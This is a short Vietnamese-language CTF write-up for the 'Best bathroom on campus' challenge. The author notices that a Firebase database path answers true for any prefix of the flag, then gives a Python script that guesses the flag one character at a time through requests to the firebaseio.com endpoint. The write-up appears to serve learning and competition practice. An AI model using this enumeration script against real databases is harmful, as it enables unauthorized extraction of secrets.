# Best bathroom on campus

![Untitled](Best%20bathroom%20on%20campus%20e086b9d3d3ca4b8d8d0e25e09d83d1cd/Untitled.png)

- Truy cập vào trang web ta thấy như sau, ta thấy khi giá trị UDCTF được truyền vào thì trả về giá trị là true.

![Untitled](Best%20bathroom%20on%20campus%20e086b9d3d3ca4b8d8d0e25e09d83d1cd/Untitled%201.png)

- Mình thử test format flag là UDCTF{ thì vẫn trả về true, có vẻ như bài này ta chỉ cần nhập vào chuỗi nằm trong flag thì sẽ trả về true, không thì sẽ là false, lúc này thì mình sẽ code python để tự động hóa

![Untitled](Best%20bathroom%20on%20campus%20e086b9d3d3ca4b8d8d0e25e09d83d1cd/Untitled%202.png)

```python
import requests

url = 'https://best-bathroom-default-rtdb.firebaseio.com/flag/'

arr = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'!$%()*+,-.:;@[]^_`{|}~"
# arr = "$%&'()*+,-./:;<=>?@[]^_`{|}~"
result = 'UDCTF{'

while True:
  for char in arr:
    print(f"Testing with {result + char}")
    
    test_url = url + result + char + '.json' 
    response = requests.get(test_url)
    
    if response.text.find('true') != -1:
      result += char
      print(f"Found character: {char}")
      print(f"Result: {result}")
      break

    if char == '}':
      print("Final flag:", result)
      exit()

  print("Start over with full arr")
```

![Untitled](Best%20bathroom%20on%20campus%20e086b9d3d3ca4b8d8d0e25e09d83d1cd/Untitled%203.png)